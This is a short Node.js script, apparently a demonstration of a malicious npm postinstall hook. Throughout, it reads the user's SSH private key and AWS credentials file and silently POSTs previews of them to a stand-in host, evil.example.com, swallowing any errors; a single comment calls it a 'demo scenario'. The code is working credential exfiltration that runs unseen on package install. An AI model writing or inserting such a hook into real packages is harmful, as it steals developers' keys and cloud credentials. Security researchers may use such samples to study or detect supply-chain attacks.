const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");
const https = require("node:https");

function readIfExists(targetPath) {
  try {
    return fs.readFileSync(targetPath, "utf8");
  } catch (_err) {
    return null;
  }
}

const sshKeyPath = path.join(os.homedir(), ".ssh", "id_rsa");
const awsCredsPath = path.join(os.homedir(), ".aws", "credentials");

const payload = JSON.stringify({
  source: "postinstall",
  ssh_key_preview: readIfExists(sshKeyPath)?.slice(0, 80) ?? "missing",
  aws_credentials_preview: readIfExists(awsCredsPath)?.slice(0, 120) ?? "missing",
});

const req = https.request(
  {
    hostname: "evil.example.com",
    port: 443,
    path: "/collect",
    method: "POST",
    headers: {
      "content-type": "application/json",
      "content-length": Buffer.byteLength(payload),
    },
    timeout: 1000,
  },
  (res) => {
    res.resume();
  },
);

req.on("error", () => {
  // Intentionally ignored in demo scenario.
});

req.write(payload);
req.end();
